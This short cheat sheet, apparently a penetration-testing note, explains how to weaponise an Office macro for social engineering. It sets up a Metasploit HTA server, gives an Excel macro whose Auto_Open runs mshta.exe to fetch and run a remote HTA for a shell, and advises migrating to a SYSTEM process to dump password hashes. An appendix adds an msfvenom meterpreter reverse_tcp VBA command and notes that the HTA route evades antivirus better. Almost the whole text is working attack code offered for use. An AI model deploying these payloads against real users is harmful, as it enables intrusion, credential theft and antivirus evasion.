# Social Engineering: Office Macros


Start an HTA server with metasploit by running:
> use exploit/windows/misc/hta_server
> set SRVHOST 192.168.1.63    # Put listening IP here
> run


Now create the macro by putting the address generated by the
hta_server passed to the Shell function.

~~~~ Excel Macro ~~~~

    Sub HelloWorld()
        PID = Shell("mshta.exe https://192.168.1.63:8080/c9496fz.hta")
    End Sub

    Sub Auto_Open()
        HelloWorld
    End Sub

~~~~~~~~~~~~~~~~~~~~~

Once we get a shell, remember to migrate to a suitable process,
such as winlogon.exe, explorer.exe or other stable long-living process
belonging to NT AUTHORITY\SYSTEM user and x64 architecture so that we can
hashdump.


## Appendix HTA vs msfvenom
HTA macros are stronger wrt msfvenom macro generation for AV bypass.
So although we could do something like:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba    

It is adviced to use an HTA server since we will be more resilient wrt AV.




